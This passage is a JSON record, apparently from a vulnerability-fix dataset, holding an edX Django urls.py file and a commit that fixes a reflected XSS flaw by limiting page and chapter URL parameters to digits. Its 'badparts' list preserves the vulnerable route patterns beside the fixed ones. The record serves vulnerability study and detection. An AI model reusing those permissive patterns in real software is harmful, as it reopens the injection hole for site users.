wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"
        },
        "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {
            "url": "https://api.github.com/repos/ExtensionEngine/ed2go-edx-platform/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "html_url": "https://github.com/ExtensionEngine/ed2go-edx-platform/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
                            "add": 8,
                            "remove": 8,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"
                            ],
                            "goodparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), 